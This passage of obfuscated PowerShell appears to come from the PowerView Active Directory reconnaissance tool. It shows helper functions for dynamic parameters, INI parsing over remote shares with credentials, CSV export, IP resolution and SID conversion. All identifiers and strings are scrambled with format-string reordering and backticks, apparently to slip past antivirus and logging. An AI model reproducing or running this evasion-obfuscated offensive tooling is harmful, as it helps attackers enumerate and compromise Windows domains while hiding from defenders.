    ${IlgEn`eRa`TOR2} = ${ImPLiCi`TcOnv`E`RTER}.("{4}{3}{2}{0}{1}"-f 'r','ator','Gene','IL','Get').Invoke()
    ${Ilg`E`NErAtO`R2}.("{1}{0}" -f 't','Emi').Invoke(  (&("{0}{1}{2}" -f'vArIA','B','Le')  ("{0}{1}"-f 'U','IrM'))."VA`luE"::"N`oP")
    ${ILg`e`NERA`TOr2}.("{0}{1}" -f'Emi','t').Invoke(  ${UI`RM}::"lDa`RG_0")
    ${i`l`gEne`Ra`ToR2}.("{1}{0}"-f'mit','E').Invoke( ( &("{1}{0}" -f 'EM','it') ("{3}{0}{1}{2}" -f'E:','U','IRm','VaRiaBl')  )."vaL`UE"::"l`dto`KEn", ${St`RuC`TbUILD`Er})
    ${I`lGe`NE`RaTo`R2}.("{0}{1}" -f'Emi','t').Invoke(  ( &("{1}{0}" -f'm','Ite') ('Var'+'IaBl'+'E'+':UiRM') )."VA`Lue"::"C`ALL",
         ${E`h`1AX}.("{0}{2}{1}" -f'G','Method','et').Invoke(("{1}{0}{2}{4}{3}{5}" -f 'Ty','Get','peF','Ha','rom','ndle')))
    ${ilGEn`ERa`Tor2}.("{1}{0}"-f 't','Emi').Invoke(  ${u`iRM}::"CA`lL",
          (  &("{0}{2}{1}" -f'V','LE','ariaB') ("XZN"+"LS") -vaLuE ).("{2}{1}{0}" -f 'od','eth','GetM').Invoke(("{0}{4}{2}{1}{3}"-f 'P','ctu','ToStru','re','tr'), [Type[]] @([IntPtr], [Type])))
    ${IlgEN`E`RA`TO`R2}.("{0}{1}" -f'Emi','t').Invoke(  (  &("{2}{1}{0}" -f'e','riABL','va') ("u"+"IrM"))."VA`lUe"::"UNBO`x`_anY", ${StR`U`CTBUildeR})
    ${ilgENERA`To`R2}.("{0}{1}"-f'E','mit').Invoke(  ( &("{1}{0}" -f 'iR','d')  ("{1}{0}{2}{3}" -f 'RiablE:U','Va','I','rm')  )."v`ALUe"::"R`ET")

    ${strUc`T`Bu`i`lDER}.("{0}{2}{1}"-f'Cr','eType','eat').Invoke()
}








Function NEw-`D`yNaMic`PA`RAmET`er {


    [CmdletBinding(dEFAultParameterSETnAme = {"{0}{3}{2}{1}" -f 'Dynam','arameter','P','ic'})]
    Param (
        [Parameter(ManDAtORy = ${t`RUe}, vAlUeFrOMpipElINe = ${T`RUE}, vaLUefromPipelinEbYpRoPERtyname = ${T`RUe}, PARaMetErsetnAMe = "d`Y`NAMiCPa`RAMeTER")]
        [ValidateNotNullOrEmpty()]
        [string]${NA`Me},

        [Parameter(vaLUEfROMPiPElINeBYpROpErtyNAmE = ${T`RUE}, PARAmEterSetNAME = "D`y`NA`MicPAR`Am`eTer")]
        [System.Type]${t`YPe} = [int],

        [Parameter(VaLuefroMpIpELIneBypRoPErtynAME = ${TR`UE}, PArAmETeRsEtName = "DynAM`Icp`ArAmETER")]
        [string[]]${Ali`AS},

        [Parameter(vALuEFRompipelinebyprOpErtyNAMe = ${tR`Ue}, pARaMEteRsEtNamE = "DyNa`M`ICP`A`RaMEteR")]
        [switch]${mand`A`T`ORY},

        [Parameter(ValUEFrOMPIpelinEbyPropeRTYnaME = ${t`Rue}, PAramEteRSEtnaME = "dYn`Amicp`AR`AM`EtEr")]
        [int]${positi`ON},

        [Parameter(VaLUefROmpiPEliNEbyPropErtynamE = ${TR`Ue}, pARaMETErsEtNAme = "DYN`AM`i`cpaRaM`EtER")]
        [string]${HEL`P`mEs`SAGe},

        [Parameter(ValuEFRomPiPElINeByprOPeRtynaME = ${Tr`Ue}, PARamEterSetNAMe = "d`yNamIC`P`AR`AMeTEr")]
        [switch]${Do`Nts`hOw},

        [Parameter(valueFrOMPIpelInebypropErTyNAmE = ${t`RuE}, PaRametERseTNaME = "DynamIC`PARAME`T`ER")]
        [switch]${vaLu`E`FRo`Mpip`ELInE},

        [Parameter(vALUefroMPIpelINEBypropeRtYnAMe = ${T`Rue}, PARamETersEtnaMe = "dY`N`AmiC`PAR`AMeter")]
        [switch]${v`A`luefroMpipElINE`By`PrO`Pe`RTyNAMe},

        [Parameter(VAlUEfrOmPIPELiNEByPROPeRtynAMe = ${T`RuE}, paRAMeTersEtname = "dyNamIC`pa`R`AMETER")]
        [switch]${VAL`U`eFROm`RemAinI`Nga`RGUMe`N`Ts},

        [Parameter(VaLueFrompIPelineByproPerTynAME = ${T`RuE}, pArAmEteRSEtnaMe = "DYNaMicP`A`Ram`e`Ter")]
        [string]${Para`Met`ER`sE`TnAme} = "__ALl`PAr`AMe`Te`Rse`Ts",

        [Parameter(ValuEFroMpiPeLinEbYprOpERTYNaMe = ${TR`UE}, PAraMETeRsEtnAMe = "dyNa`micPaR`AMEt`er")]
        [switch]${a`L`l`ownulL},

        [Parameter(vaLuEFromPipELINEBypROPertYnAME = ${Tr`UE}, pARaMETERsEtnamE = "dy`NA`micPA`RA`MeteR")]
        [switch]${alloWeMPT`Ys`TRI`Ng},

        [Parameter(vaLUefROmPiPeLIneBYPRopERTYnAMe = ${TR`Ue}, ParAMetErSetnamE = "d`Y`NamiCPaRaMEtER")]
        [switch]${aL`lO`WEmPTYCoL`Lection},

        [Parameter(vAlUEfROMPIpElInEByPropErtYnamE = ${t`Rue}, paRAMEtERSetName = "Dynam`icpaRame`T`eR")]
        [switch]${vA`l`Ida`T`enoTnuLl},

        [Parameter(VALUEfRompiPELIneBypROPERtyNaMe = ${T`Rue}, ParaMEterSeTnamE = "dy`N`Ami`Cp`ARAMEtER")]
        [switch]${VaLIda`TEN`OtNULLOre`MPty},

        [Parameter(VAlUEFrOmPipeliNEbyPRopERtYNamE = ${t`RUE}, ParAmeTeRsETnAme = "DyNAMICPa`R`AMe`TEr")]
        [ValidateCount(2,2)]
        [int[]]${VA`l`IDaTe`CO`UnT},

        [Parameter(vaLuEfrOmpiPEliNEbYpROPERTyNAMe = ${Tr`Ue}, paRAMETErSetNamE = "D`YN`AM`icparA`metER")]
        [ValidateCount(2,2)]
        [int[]]${V`Al`iDaTERa`NGE},

        [Parameter(vAlUEfrOmpIPELiNebyPROPERtyName = ${tr`UE}, pArameTeRSETNAMe = "D`YnAmIcPar`A`ME`TER")]
        [ValidateCount(2,2)]
        [int[]]${v`ALid`At`ele`Ngth},

        [Parameter(VALueFroMpIpelInebYPRoPErTyNAmE = ${Tr`UE}, PARAMEtERSEtnAME = "DY`NaMIC`Par`AmE`TER")]
        [ValidateNotNullOrEmpty()]
        [string]${v`AL`IdA`TEp`AtteRn},

        [Parameter(valuefRompiPeLinEBYproPErtYnAmE = ${TR`UE}, PaRamETerseTname = "dYNA`MICPa`Ra`mETeR")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]${vAl`iD`A`TEscrIPT},

        [Parameter(vALuEFromPIPelINebYprOPERtYNaMe = ${Tr`UE}, PaRAMETERsEtNaME = "dYnAMICPaR`A`Me`Ter")]
        [ValidateNotNullOrEmpty()]
        [string[]]${VA`Li`d`AtesET},

        [Parameter(VALUEfrOMpiPeLinEBYproPertyNAme = ${tR`Ue}, paraMetErsEtNAme = "dyN`AmiCpaR`AmetEr")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!(${_} -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ("{4}{3}{12}{7}{10}{6}{14}{0}{13}{8}{11}{9}{2}{5}{1}" -f'fin','t','ry obje','ary must be a Syst','Diction','c','utomation.Runti','n','dPara','a','t.A','meterDiction','em.Manageme','e','meDe')
            }
            ${Tr`Ue}
        })]
        ${DIc`TI`OnAry} = ${Fa`L`se},

        [Parameter(manDAtoRY = ${TR`UE}, VALUefrOMpiPeliNEBypRopeRTynAme = ${tR`UE}, pARAmEtErSEtNAme = "C`REA`TevariABLeS")]
        [switch]${c`REatEV`A`RIAbLes},

        [Parameter(MAndatOrY = ${t`RuE}, vaLuefRomPIPelINeBYprOpErTyNAMe = ${tR`Ue}, PArAMeTErSeTnAmE = "Cre`AteV`AriaB`lES")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            
            
            if(${_}.("{1}{0}" -f'pe','GetTy').Invoke()."n`Ame" -notmatch ("{1}{0}{2}" -f 'iona','Dict','ry')) {
                Throw ("{23}{16}{9}{22}{17}{6}{19}{20}{21}{15}{7}{4}{5}{8}{13}{12}{2}{18}{1}{11}{3}{10}{0}{14}"-f 'ionary obje','e','Para','e','nt.','Automat','be ','Manageme','ion.','s mu','rsDict','t','und','PSBo','ct','em.','dParameter','t ','m','a ','Sy','st','s','Boun')
            }
            ${t`RuE}
        })]
        ${BO`UNDPaRA`me`T`erS}
    )

    Begin {
        ${i`NTeR`N`AlDiCTiO`Na`Ry} = &("{0}{2}{1}" -f 'New-Ob','ct','je') -TypeName ("{0}{3}{7}{16}{1}{15}{10}{9}{2}{12}{6}{8}{14}{13}{4}{17}{11}{5}" -f'S','t.Au','t','yst','DefinedPara','Dictionary','on.','e','Run','a','om','eter','i','ime','t','t','m.Managemen','m')
        function _te`Mp { [CmdletBinding()] Param() }
        ${C`o`mMOnPAR`A`meTeRS} = (&("{3}{0}{2}{1}"-f't-C','mmand','o','Ge') ("{1}{0}"-f 'p','_tem'))."p`ARAMet`eRS"."KE`ys"
    }

    Process {
        if(${createvari`A`B`l`es}) {
            ${bO`UnD`keys} = ${BoUnDp`Arame`T`eRs}."ke`yS" | &("{0}{2}{1}" -f 'Whe','Object','re-') { ${COmm`On`PAR`A`mEtErS} -notcontains ${_} }
            ForEach(${parA`me`TeR} in ${b`OunDk`Eys}) {
                if (${P`ARA`meTer}) {
                    &("{0}{3}{1}{2}" -f 'Se','ar','iable','t-V') -Name ${p`ARam`Et`ER} -Value ${bouN`Dpa`R`AM`eTERS}.${pAr`Am`etEr} -Scope 1 -Force
                }
            }
        }
        else {
            ${sTA`L`E`kEYs} = @()
            ${st`AlE`K`EYs} = ${PSboU`N`dp`ARAMe`TErS}.("{1}{2}{0}" -f'Enumerator','G','et').Invoke() |
                        &("{3}{0}{2}{1}"-f 'rEach','ject','-Ob','Fo') {
                            if(${_}."V`AlUE"."p`SoBJ`ECT"."M`e`THODS"."nA`ME" -match (('^Equalsc'+'C'+'o')."r`eP`lACE"(([CHAr]99+[CHAr]67+[CHAr]111),[sTRING][CHAr]36))) {
                                
                                if(!${_}."VA`lue".("{1}{0}"-f 'ls','Equa').Invoke((&("{3}{0}{1}{2}"-f 't-Var','iab','le','Ge') -Name ${_}."k`EY" -ValueOnly -Scope 0))) {
                                    ${_}."K`Ey"
                                }
                            }
                            else {
                                
                                if(${_}."Val`Ue" -ne (&("{1}{0}{2}"-f'e','G','t-Variable') -Name ${_}."k`eY" -ValueOnly -Scope 0)) {
                                    ${_}."k`ey"
                                }
                            }
                        }
            if(${S`TALe`kEyS}) {
                ${sTALE`K`EYs} | &("{2}{0}{1}{3}"-f'orEach-Obje','c','F','t') {[void]${PsbO`U`NdPAR`AmEte`Rs}.("{0}{1}" -f 'Re','move').Invoke(${_})}
            }

            
            ${uNbouND`pA`RaMET`e`RS} = (&("{2}{1}{0}" -f 'Command','et-','G') -Name (${PScM`dl`eT}."M`yiNvO`Cati`on"."in`VocaTiONnA`mE"))."Par`AMe`TErs".("{0}{1}{3}{2}"-f'GetEnu','me','tor','ra').Invoke()  |
                                        
                                        &("{1}{0}{2}"-f 'r','Whe','e-Object') { ${_}."vaL`Ue"."PA`Ra`MeTE`RS`ets"."k`EYS" -contains ${pSCmdL`Et}.PAramETErSETname } |
                                            &("{0}{3}{1}{2}" -f'S','ect-Objec','t','el') -ExpandProperty ("{0}{1}"-f'Ke','y') |
                                                
                                                &("{3}{2}{1}{0}" -f't','re-Objec','e','Wh') { ${P`sBoUNdpa`R`Am`eteRs}."K`eys" -notcontains ${_} }

            
            ${t`Mp} = ${nu`ll}
            ForEach (${pA`Ra`MetEr} in ${UNboU`Nd`PaRamet`Ers}) {
                ${DEfA`U`lTv`AlUE} = &("{1}{2}{0}{3}" -f'-Varia','G','et','ble') -Name ${PaRA`MEt`er} -ValueOnly -Scope 0
                if(!${P`SBoUndP`AR`Amet`ErS}."TRyg`E`TVAl`Ue"(${pA`RAmEt`ER}, [ref]${T`mp}) -and ${D`EF`A`UL`TvALuE}) {
                    ${PS`B`ouND`PaR`AmETE`Rs}.${pA`R`AMeter} = ${D`EFa`Ul`TVALUe}
                }
            }

            if(${dI`Ct`IONarY}) {
                ${dpdICTi`ON`A`Ry} = ${diCT`IOn`ARY}
            }
            else {
                ${DP`dI`CTIONARy} = ${inTe`Rn`ALdIctI`oN`A`RY}
            }

            
            ${geT`VAR} = {&("{2}{3}{1}{0}" -f 'e','ariabl','Ge','t-V') -Name ${_} -ValueOnly -Scope 0}

            
            ${A`TtrIB`U`TeRegex} = (('^(Manda'+'t'+'o'+'ryx'+'UH'+'Posi'+'tionxUHPara'+'me'+'t'+'erSetNa'+'mexU'+'H'+'DontSho'+'wxUHHelp'+'MessagexUHValueFr'+'omPipelinexUHVa'+'lueFromPi'+'peli'+'neB'+'yP'+'ropertyNamexUHValueFromRe'+'m'+'a'+'i'+'ningArg'+'umen'+'ts)iFo')."Re`pL`ACE"(([cHAr]105+[cHAr]70+[cHAr]111),[stRing][cHAr]36).("{1}{2}{0}" -f'LaCE','rE','P').Invoke('xUH','|'))
            ${vA`Li`DaTiONREgeX} = (('^(Allo'+'w'+'Nu'+'ll7'+'CtA'+'ll'+'owEmptyS'+'trin'+'g7Ct'+'A'+'l'+'l'+'o'+'wEmptyCo'+'l'+'lect'+'i'+'o'+'n7Ct'+'Valida'+'t'+'eCoun'+'t7'+'CtV'+'alid'+'a'+'teL'+'e'+'ngt'+'h'+'7CtVa'+'lidate'+'Pat'+'tern7'+'CtValid'+'a'+'te'+'Ran'+'ge7CtVali'+'dateS'+'c'+'ript7CtVal'+'idat'+'eSet7'+'CtVa'+'lida'+'te'+'Not'+'N'+'ull'+'7'+'C'+'t'+'Valida'+'teNot'+'Nu'+'llOrEmpty)'+'lST')."r`epLaCE"(([CHAr]55+[CHAr]67+[CHAr]116),'|')."rE`PLA`cE"('lST',[String][CHAr]36))
            ${al`IAS`R`eGEX} = {('^'+'Alia'+'s'+'{0}')-F[cHar]36}
            ${pAr`AmE`TeRAtT`RIbUtE} = &("{1}{2}{0}" -f 'bject','Ne','w-O') -TypeName ("{5}{7}{0}{1}{2}{4}{3}{8}{6}{9}"-f 't','o','ma','ara','tion.P','System.','tr','Management.Au','meterAt','ibute')

            switch -regex (${PSbOUn`Dpa`R`A`MeTeRs}."kE`ys") {
                ${AT`T`RIB`UteR`eGEX} {
                    Try {
                        ${PARAME`TeRaTT`R`i`BUte}.${_} = . ${G`E`TVar}
                    }
                    Catch {
                        ${_}
                    }
                    continue
                }
            }

            if(${d`PdIcTI`oNArY}."K`eys" -contains ${na`ME}) {
                ${d`pDIc`TI`OnarY}.${n`AME}."At`T`Rib`UTEs".("{1}{0}" -f'd','Ad').Invoke(${PARam`etErAtTr`IB`U`TE})
            }
            else {
                ${a`T`Tr`ibu`T`ECOlLEcTIOn} = &("{1}{2}{3}{0}"-f't','New-','Obje','c') -TypeName ("{13}{5}{1}{11}{7}{3}{10}{8}{12}{0}{2}{4}{9}{6}{14}"-f 'm.','ns.ObjectM','A','llec','t','lectio','ribut','.Co','i','t','t','odel','on[Syste','Col','e]')
                switch -regex (${pS`BOuNdp`ArAMEtE`Rs}."K`eYS") {
                    ${Va`Lid`AtiO`NrEGeX} {
                        Try {
                            ${P`ARA`ME`TeROPt`iO`NS} = &("{0}{1}{2}" -f'New','-','Object') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. ${ge`T`Var}) -ErrorAction ("{0}{1}" -f 'St','op')
                            ${at`TRI`Bu`TECo`llEct`ION}.("{1}{0}"-f 'd','Ad').Invoke(${P`AR`AmeTer`Op`Tions})
                        }
                        Catch { ${_} }
                        continue
                    }
                    ${AlI`As`REgEX} {
                        Try {
                            ${pA`RA`mEt`eRalI`As} = &("{2}{0}{1}" -f 'c','t','New-Obje') -TypeName ("{8}{6}{2}{1}{7}{4}{0}{5}{3}"-f'asAtt','na','em.Ma','ute','ation.Ali','rib','yst','gement.Autom','S') -ArgumentList (. ${g`Et`VAR}) -ErrorAction ("{0}{1}"-f'Sto','p')
                            ${A`T`TRi`B`UTECOllect`ioN}.("{1}{0}"-f 'd','Ad').Invoke(${P`A`RAMe`TE`RaLiaS})
                            continue
                        }
                        Catch { ${_} }
                    }
                }
                ${A`TTr`iBuT`eC`o`lLeCtioN}.("{0}{1}" -f 'Ad','d').Invoke(${PAramE`Tera`TTrI`B`UTE})
                ${P`Ar`AMeteR} = &("{2}{3}{0}{1}"-f 'Ob','ject','New','-') -TypeName ("{2}{5}{10}{9}{7}{4}{11}{6}{0}{1}{3}{8}"-f 'Defi','n','Sy','edPar','u','s','me','.A','ameter','t','tem.Managemen','tomation.Runti') -ArgumentList @(${Na`mE}, ${Ty`pe}, ${aTtRIb`U`TE`co`llECtion})
                ${D`pDi`cTIonary}.("{0}{1}" -f'Ad','d').Invoke(${NA`ME}, ${P`AraMET`er})
            }
        }
    }

    End {
        if(!${cRea`TEV`A`RIaBL`eS} -and !${DICt`IONA`Ry}) {
            ${dPD`IcTI`o`Nary}
        }
    }
}


function G`Et-`INIC`onTEnt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{3}" -f'PSS','houldP','ro','cess'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(POSItIOn = 0, manDaTorY = ${tR`Ue}, VALuEFRompIPeLiNe = ${tR`UE}, VAlueFRoMpiPELiNEbYPropertyNamE = ${tR`Ue})]
        [Alias({"{1}{2}{0}"-f 'me','Full','Na'}, {"{0}{1}" -f 'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ATH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`den`TIAl} =  (  &("{3}{1}{0}{2}"-f 'a','ari','BlE','GEt-v')  ("J"+"h3XO"+"6")  -VALueoNL  )::"emp`Ty",

        [Switch]
        ${ou`TpU`TobJeCT}
    )

    BEGIN {
        ${mAp`Pedc`O`MPUTerS} = @{}
    }

    PROCESS {
        ForEach (${T`ARge`TPA`TH} in ${p`Ath}) {
            if ((${T`ARGet`p`Ath} -Match ((("{2}{0}{4}{1}{3}" -f 'jh','.*2jh2jh.','2jh2','*','2jh2jh'))."R`E`PLAce"('2jh',[StriNG][CHAR]92))) -and (${p`sb`oUN`DPARAMet`eRs}[("{2}{0}{1}{3}" -f'nti','a','Crede','l')])) {
                ${HO`StC`Om`puTeR} = (&("{0}{1}{2}" -f 'New','-','Object') ("{1}{0}{2}"-f'U','System.','ri')(${t`Arg`EtPa`TH}))."Ho`St"
                if (-not ${MA`Ppedco`Mp`U`TeRs}[${h`oS`TcOmP`U`TEr}]) {
                    
                    &("{5}{2}{0}{3}{1}{4}{6}"-f'n','ti','o','nec','o','Add-RemoteC','n') -ComputerName ${H`o`sTCO`MPUtER} -Credential ${creDE`N`Tial}
                    ${mappEd`Co`MpuT`ErS}[${HOS`TcoM`PutER}] = ${t`RUE}
                }
            }

            if (&("{2}{1}{0}" -f 'Path','-','Test') -Path ${t`AR`gEtPATH}) {
                if (${PSbOU`Nd`pa`Ramet`ERs}[("{1}{3}{2}{0}"-f't','O','jec','utputOb')]) {
                    ${I`Ni`oBject} = &("{2}{0}{1}" -f'ew-Obj','ect','N') ("{0}{2}{1}"-f'PSOb','ct','je')
                }
                else {
                    ${inI`obje`ct} = @{}
                }
                Switch -Regex -File ${TaR`GeT`PA`TH} {
                    ((("{2}{0}{1}"-f'0}[(.+','){0}]','^{'))  -F  [chaR]92) 
                    {
                        ${S`EcTI`ON} = ${maTC`h`es}[1].("{0}{1}" -f 'Tri','m').Invoke()
                        if (${Psb`ouNDpaRa`MeT`Ers}[("{2}{1}{0}{3}" -f'tObje','u','Outp','ct')]) {
                            ${sEC`Tion} = ${sEC`TiON}.("{2}{0}{1}"-f'ac','e','Repl').Invoke(' ', '')
                            ${seCTIoNoB`Je`cT} = &("{2}{0}{1}"-f 'ec','t','New-Obj') ("{2}{0}{1}" -f'S','Object','P')
                            ${I`NI`ObjE`ct} | &("{1}{0}{2}{3}" -f'-Memb','Add','e','r') ("{1}{2}{0}" -f 'teproperty','N','o') ${S`eC`TioN} ${sE`CTI`ONO`Bje`Ct}
                        }
                        else {
                            ${iNiob`j`E`ct}[${sE`CtI`oN}] = @{}
                        }
                        ${COM`me`N`TCoUNt} = 0
                    }
                    "^(;.*)$" 
                    {
                        ${v`ALUE} = ${MAt`Ch`Es}[1].("{1}{0}" -f'rim','T').Invoke()
                        ${cOM`MeNTC`O`UNt} = ${Co`mm`En`TcoUNT} + 1
                        ${N`Ame} = ("{0}{1}" -f'Co','mment') + ${cO`MMentCo`U`NT}
                        if (${PSbo`UnDP`A`RAMet`erS}[("{3}{0}{2}{1}" -f't','utObject','p','Ou')]) {
                            ${nA`ME} = ${n`AMe}.("{0}{2}{1}"-f 'Re','lace','p').Invoke(' ', '')
                            ${in`IoBjE`cT}.${SECti`ON} | &("{1}{0}{2}"-f'b','Add-Mem','er') ("{2}{0}{1}" -f'teprop','erty','No') ${n`Ame} ${VA`L`UE}
                        }
                        else {
                            ${InIO`B`jeCt}[${sec`Ti`oN}][${NA`ME}] = ${vA`L`Ue}
                        }
                    }
                    ((("{0}{3}{1}{2}" -f'(.+','S','Is*=(.*)','?)0')) -REPlace '0SI',[chAr]92) 
                    {
                        ${nA`mE}, ${V`ALUE} = ${MaTC`H`eS}[1..2]
                        ${N`AMe} = ${n`Ame}.("{1}{0}"-f'im','Tr').Invoke()
                        ${vA`l`Ues} = ${vAL`UE}.("{1}{0}" -f'lit','sp').Invoke(',') | &("{0}{1}{2}" -f 'ForEach-','Obj','ect') { ${_}.("{0}{1}" -f'Tri','m').Invoke() }

                        

                        if (${psBo`UNdp`ARAM`ETe`Rs}[("{1}{2}{0}"-f 'ect','OutputOb','j')]) {
                            ${Na`Me} = ${N`AmE}.("{0}{2}{1}"-f 'Re','ce','pla').Invoke(' ', '')
                            ${iNI`ob`jecT}.${sE`CtI`on} | &("{2}{1}{0}"-f 'r','Membe','Add-') ("{0}{3}{2}{1}" -f 'Noteprop','ty','r','e') ${n`AmE} ${v`A`luES}
                        }
                        else {
                            ${in`Io`B`JeCT}[${s`e`ctiON}][${N`AMe}] = ${vaL`U`eS}
                        }
                    }
                }
                ${IniO`B`jECt}
            }
        }
    }

    END {
        
        ${mA`p`PE`dcOMPU`TerS}."k`EyS" | &("{3}{2}{0}{1}" -f'RemoteCon','nection','ove-','Rem')
    }
}


function eXpor`T-`POWeRvIe`wc`SV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{4}{2}" -f'Sho','PS','ss','u','ldProce'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(MaNdatORY = ${t`RUE}, ValUEfrOmPiPElIne = ${TR`UE}, VAluEFROMpiPElInEbYprOpertYnaME = ${t`RuE})]
        [System.Management.Automation.PSObject[]]
        ${IN`pu`TOB`jECT},

        [Parameter(MANdATORY = ${TR`Ue}, PoSiTiON = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${p`Ath},

        [Parameter(pOSitiON = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        ${D`elIm`iter} = ',',

        [Switch]
        ${Ap`pE`Nd}
    )

    BEGIN {
        ${OU`T`PUT`pATH} =  ( &("{0}{1}" -f 'It','em') ("{2}{1}{3}{0}" -f ':f3GJZ','r','Va','iable')  )."VaL`Ue"::"geT`FulL`p`AtH"(${PsbO`Un`dpARAMET`ERS}[("{0}{1}" -f'Pat','h')])
        ${Exis`Ts} =  ${dKc1`W5}::("{0}{1}" -f 'Ex','ists').Invoke(${outPuTP`A`Th})

        
        ${mu`Tex} = &("{0}{3}{1}{2}"-f 'Ne','Obje','ct','w-') ("{3}{0}{1}{4}{2}"-f'te','m.','ng.Mutex','Sys','Threadi') ${f`Al`sE},("{2}{0}{1}" -f'VMu','tex','CS')
        ${N`Ull} = ${Mut`EX}.("{0}{1}{2}"-f 'W','aitO','ne').Invoke()

        if (${pS`BO`Un`DP`ArAM`ETErS}[("{1}{0}"-f'd','Appen')]) {
            ${fi`LEmode} =  (&("{3}{2}{0}{1}"-f'i','aBLe','-var','GEt') ("{1}{0}{2}"-f'yKF','0M','p') -VAl )::"AP`pE`Nd"
        }
        else {
            ${fi`L`Em`ode} =  ( &("{2}{0}{1}" -f'l','E','GeT-vARiab') ("{0}{1}"-f '0M','yKfP') )."v`AlUE"::"c`ReATe"
            ${ExIS`TS} = ${FAL`sE}
        }

        ${cs`VSTr`E`AM} = &("{3}{2}{1}{0}"-f'ct','Obje','w-','Ne') ("{2}{1}{0}"-f'am','leStre','IO.Fi')(${OU`T`PU`Tpath}, ${fil`em`o`de},  ${5`lVu}::"wR`iTe",   ${AKB`8j7}::"R`EaD")
        ${cS`VWR`It`ER} = &("{2}{1}{0}" -f'ct','Obje','New-') ("{2}{5}{6}{0}{4}{1}{3}" -f 'r','Wri','Syste','ter','eam','m.IO','.St')(${CSVst`R`eAM})
        ${C`SVwr`ITEr}."AU`Tof`L`USH" = ${T`RUe}
    }

    PROCESS {
        ForEach (${e`N`TRy} in ${i`N`pUtoBJE`ct}) {
            ${OB`JecT`CSv} = &("{1}{0}{2}"-f 'T','Convert','o-Csv') -InputObject ${E`NTrY} -Delimiter ${D`E`LimiTeR} -NoTypeInformation

            if (-not ${EXI`sTs}) {
                
                ${objE`Ct`CsV} | &("{2}{1}{0}"-f 't','Objec','ForEach-') { ${csVWRi`T`Er}.("{2}{0}{1}" -f'ri','teLine','W').Invoke(${_}) }
                ${E`XI`sTs} = ${t`Rue}
            }
            else {
                
                ${oBj`e`CtC`sV}[1..(${obje`c`TcsV}."LEng`TH"-1)] | &("{0}{4}{1}{3}{2}"-f'Fo','ch-Obj','t','ec','rEa') { ${cSvw`RI`T`ER}.("{0}{1}" -f'WriteLi','ne').Invoke(${_}) }
            }
        }
    }

    END {
        ${Mu`Tex}.("{1}{2}{3}{0}"-f'eMutex','Rel','e','as').Invoke()
        ${cSVwri`T`Er}.("{1}{0}"-f 'se','Dispo').Invoke()
        ${c`svS`TReam}.("{0}{1}"-f 'Di','spose').Invoke()
    }
}


function REs`olv`e-ipA`Dd`ReSS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{1}{2}"-f 'r','o','cess','ShouldP','PS'}, '')]
    [OutputType({"{10}{9}{6}{3}{2}{1}{0}{8}{7}{5}{4}" -f't.','anagemen','.M','tem','Object','tion.PSCustom','s','ma','Auto','y','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTIOn = 0, valueFROmpipElinE = ${tr`UE}, VAlUefrompiPeLiNEbYpropERtYnaMe = ${TR`UE})]
        [Alias({"{2}{0}{1}"-f 'ostN','ame','H'}, {"{1}{3}{2}{0}" -f 'name','d','t','nshos'}, {"{1}{0}" -f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`mpu`TeR`NamE} = ${EnV:`Co`M`PUTe`RnAME}
    )

    PROCESS {
        ForEach (${C`O`mPutEr} in ${c`oMp`UT`ErNAme}) {
            try {
                @(( ${1c`45`yK}::("{3}{2}{1}{0}" -f'y','tr','ostEn','GetH').Invoke(${COM`P`UTER}))."AD`D`R`essLiST") | &("{2}{3}{1}{0}{4}"-f'Ob','ch-','ForE','a','ject') {
                    if (${_}."ADdrES`S`F`AmiLy" -eq ("{0}{2}{1}" -f'I','etwork','nterN')) {
                        ${O`Ut} = &("{3}{2}{0}{1}"-f 'c','t','-Obje','New') ("{1}{0}" -f'ct','PSObje')
                        ${o`UT} | &("{1}{2}{0}{3}"-f'e','Add-','Memb','r') ("{2}{1}{3}{0}"-f 'y','r','Noteprope','t') ("{1}{3}{0}{2}"-f 'N','Comp','ame','uter') ${COMP`U`TEr}
                        ${O`Ut} | &("{2}{3}{0}{1}" -f 'Memb','er','A','dd-') ("{0}{3}{2}{1}"-f 'N','erty','rop','otep') ("{1}{0}{2}" -f 'dres','IPAd','s') ${_}."iPA`dDreSST`OST`RinG"
                        ${O`UT}
                    }
                }
            }
            catch {
                &("{1}{2}{0}"-f'e','Write-','Verbos') ('['+'R'+'es'+'olve-IPA'+'ddr'+'ess] '+'C'+'ould'+' '+'no'+'t '+'res'+'ol'+'ve '+"$Computer "+'to'+' '+'an'+' '+'I'+'P '+'Ad'+'d'+'ress.')
            }
        }
    }
}


function c`o`NvErTto-S`ID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}"-f 'PSShou','rocess','ldP'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mandaTorY = ${TR`Ue}, VAlUEFROMpiPelinE = ${t`RUE}, VAluEfrOMPipELiNeByprOPErtynAmE = ${tr`Ue})]
        [Alias({"{1}{0}" -f'me','Na'}, {"{2}{1}{0}" -f 'y','entit','Id'})]
        [String[]]
        ${O`B`jecT`NAme},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}" -f 'ont','DomainC','oller','r'})]
        [String]
        ${s`Erv`eR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RE`DeNtI`Al} =   (  &("{1}{3}{2}{0}"-f'iable','g','-VaR','et')  ("{0}{1}" -f 'jh3','xO6')  -VA  )::"e`MPtY"
    )

    BEGIN {
        ${doM`AiNsE`A`R`c`heRarg`UmEnTS} = @{}
